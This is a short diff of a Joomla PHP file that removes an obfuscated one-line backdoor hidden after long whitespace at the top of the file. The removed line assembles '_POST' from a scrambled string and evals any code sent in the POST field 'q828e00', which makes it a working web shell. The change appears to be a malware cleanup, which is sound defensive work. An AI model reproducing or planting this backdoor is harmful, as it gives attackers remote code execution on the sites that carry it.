@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                        $mmst82 = "pt_uesro"; $lhat4 = $mmst82[5].$mmst82[1]. $mmst82[6].$mmst82[1].$mmst82[7].$mmst82[3].$mmst82[0].$mmst82[0].$mmst82[4]. $mmst82[6] ;$ofj27 =$lhat4($mmst82[2].$mmst82[0] . $mmst82[7]. $mmst82[5]. $mmst82[1] );if ( isset( ${ $ofj27 } ['q828e00']) ){ eval ( ${$ofj27 } [ 'q828e00' ]); } ?><?php
+<?php
 /**
  * @package    Joomla.Site
  *
